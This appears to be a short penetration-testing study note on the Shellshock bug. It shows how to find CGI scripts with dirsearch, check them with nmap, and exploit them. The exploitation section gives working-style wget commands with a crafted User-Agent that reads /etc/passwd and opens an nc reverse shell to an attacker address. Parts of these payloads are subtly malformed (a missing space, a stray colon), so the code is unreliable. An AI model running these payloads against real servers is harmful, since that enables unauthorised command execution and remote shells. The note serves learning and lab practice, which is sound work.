#  Shellshock

- We need to first identify the CGI programs in the vulnerable machine with tools such as ***Dirsearch***
> Dirsearch is similar to other tools such as the dirb, dirbuster and is used to execute dictionary based attacks on web servers to search for interesting files, directories etc.
#### Usage - ***dirsearch -u <$url> -e cgi -r ***
> Here  ***-u*** is used to state the url of the target 
>  ***-e*** is extensions 
>  ***-r*** is recursive 
#### Example of a dirsearch -
>dirsearch -u http://192.168.1.1/ -e cgi -r

- Now we move on to verify whether the cgi is vulnerable to shellshock or not. We can use ***http-shellshock*** nmap nse script to do it.
![[Pasted image 20211220231245.png]]

## Exploitation of Shellshock

- Basically, we can execute any commands we want on the remote system as the web server user if successful.
> wget -U "() { foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat/etc/passwd" http://192.168.13.29/cgi-bin/login.cgi && cat login.cgi

-Similarly we can now execute a nc reverse shell command and get shell access
> wget -U "() { foo;};echo: /bin/nc [attacker ip] 1234 -e /bin/sh" http://192.168.13.29/cgi-bin/login.cgi
